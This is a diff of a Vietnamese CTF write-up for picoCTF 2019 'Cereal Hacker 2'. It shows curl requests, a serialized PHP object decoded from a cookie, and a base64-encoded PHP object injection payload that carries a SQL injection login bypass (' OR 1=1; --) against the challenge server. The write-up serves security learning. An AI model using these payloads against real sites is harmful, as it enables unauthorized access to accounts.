@@ -18,6 +18,7 @@ Okay, trước tiên chúng ta hãy test thử trang login này nào.
 
 2/ Kiểm tra lỗ hổng Local File Inclusion:
 URL của trang login này là: https://2019shell1.picoctf.com/problem/32256/index.php?file=login. Hmm, đoạn `index.php?file=login` khiến mình khá là trigger:v Thay "login" bằng "admin" thử xem sao. Bật curl lên múa thôi nào các bạn:))
+
 ```html
 root@antoine:~# curl https://2019shell1.picoctf.com/problem/32256/index.php?file=admin
 <!DOCTYPE html>
@@ -46,11 +47,17 @@ root@antoine:~# curl https://2019shell1.picoctf.com/problem/32256/index.php?file
 
 	</body>
 ```
+
 URL https://2019shell1.picoctf.com/problem/32256/index.php?file=admin dẫn ta đến một local file của web server như phía dưới:
+
 ![PicoCTF 2019: Cereal Hacker 2 (500p) - DEV](https://res.cloudinary.com/practicaldev/image/fetch/s--YnxtPU-W--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/ffnkvrvpvxh0qxqrsro4.png)
+
 F12 để check xem cookie thế nào thì cũng không thấy gì đặc biệt. Thôi thì bấm vào "Go back to login" để quay lại cái trang login ban đầu vậy:((
+3/ Kiểm tra dữ liệu HTTP POST:
 Trong lúc bắt đầu thấy nản vcl thì mình nảy ra ý tưởng: "Có tài khoản admin thì phải có tài khoản guest chứ nhỉ?" Nhập vào username và password đều là "guest" thử xem. Tada!
+
 ![picoCTF 2019 - cereal hacker 1](https://blog.kakaocdn.net/dn/cj4IyA/btqyYPR6PT0/ZK8nMXznDOfidw8oyK44O0/img.png) 
+
 Khi nhập vào các mục của trang login, mình nhận thấy không có bất kì thay đổi gì đặc biệt trên thanh URL ngoài `file=regular_user` . Vậy nhiều khả năng input được truyền tới server bằng phương thức POST. Bật curl lên và xem dữ liệu HTTP POST được gửi tới server như nào thôi nào:3
 Dùng lệnh: 
 ```console
@@ -72,15 +79,16 @@ O:11:"permissions": --> object có tên là "permissions",độ dài của strin
             s:8:"password"; s:5:"guest"; --> tên của thuộc tính password là một string độ dài 8, giá trị của nó là 1 string độ dài 5.  
         }
 ```
+4/ PHP Object injection:
 Object này chứa thông tin để xác thực tài khoản "guest". Vậy nếu chúng ta sửa username thành admin và sử dụng SQL injection để bypass password rồi gói payload này vào 1 [custom HTTP headers](https://www.keycdn.com/support/custom-http-headers)
 rồi gửi nó ngược lại cho thằng server thì sao nhỉ? Okay, triển thôi (lưu ý phải thay đổi luôn cả độ dài của string ứng với từng mục nhập vào):
 
  ```
-O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:8:"' OR 1=1";}
+O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:12:"' OR 1=1; --";}
 ```
 Mã hóa base64 đống payload này. Sau đó gán output sau khi encode vào cookie user_info chúng ta sẽ gửi nó tới server thông qua URL https://2019shell1.picoctf.com/problem/32256/index.php?file=admin như sau:
 ```console 
-curl https://2019shell1.picoctf.com/problem/32256/index.php?file=admin -H "Cookie: user_info=TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6ODoiJyBPUiAxPTEiO30" && echo
+curl https://2019shell1.picoctf.com/problem/32256/index.php?file=admin -H "Cookie: user_info=TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MTI6IicgT1IgMT0xOyAtLSI7fQ" && echo
 ```
 Hic hic, server trả về đúng trang cũ (You are not admin!). Tiếp tục thử payload khác nào: 
  ```
